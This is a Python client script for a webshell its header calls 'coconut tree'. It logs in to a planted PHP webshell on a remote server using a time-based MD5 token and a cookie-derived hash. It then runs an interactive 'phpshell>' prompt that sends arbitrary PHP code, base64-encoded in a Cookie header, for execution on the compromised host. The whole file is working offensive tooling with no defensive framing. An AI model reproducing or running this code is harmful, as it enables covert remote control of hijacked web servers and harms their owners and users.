# /usr/bin python3
# -*- coding: UTF-8 -*-
# author:Wisdomtree
# coconut tree webshell manage

import time
import hashlib
import sys
import requests
import math
import base64


def first(url):
	time_code=int(time.time())
	data={"time":hashlib.md5(str(time_code+100).encode(encoding='UTF-8')).hexdigest(),"action":"pwd"}
	re=requests.post(url=url,data=data)
	pwd=str(re.headers['Set-Cookie'])
	hash_pwd=pwd[pwd.find("hash="):37].replace("hash=","")
	return hash_pwd


def second(url,hash_pwd,code):
	time_code=int(time.time())
	data={"time":hashlib.md5(str(time_code+100).encode(encoding='UTF-8')).hexdigest()}
	headers={"Cookie":"a="+hash_pwd+";code="+str(base64.b64encode(bytes(code,"UTF-8")),"UTF-8")}
	re=requests.post(url=url,data=data,headers=headers)
	return re.text

def login(url):
	hash_pwd=first(url)
	content=second(url,hash_pwd,"print(base64_decode(\"NDFkNWM4ZDRhZjEzZjNmNDdjMTk0YThmNmQ3YTYwZjQ=\"));")
	if content.find("41d5c8d4af13f3f47c194a8f6d7a60f4")>-1:
		return 1
	else:
		return 0

def execute_code(url,code):
	hash_pwd=first(url)
	content=second(url,hash_pwd,code)
	try:
		print(content)
	except:
		print(content.decode("utf-8"))



if __name__ == '__main__':
	try:
		url=sys.argv[1]
		url=url+"?time=b058a6e96315c21c93bde867f989af82"
		if login(url)>0:
			print("Login successful:\r\n")
			flag=1
			while flag!=0:
				phpcode=str(input("phpshell>"))
				if phpcode=="exit":
					flag=0
				execute_code(url,phpcode)

			exit()
		else:
			print("Login failed")
			exit()
	except:
		print("Please input: python3 Coconut_tree.py webshell")
		exit()
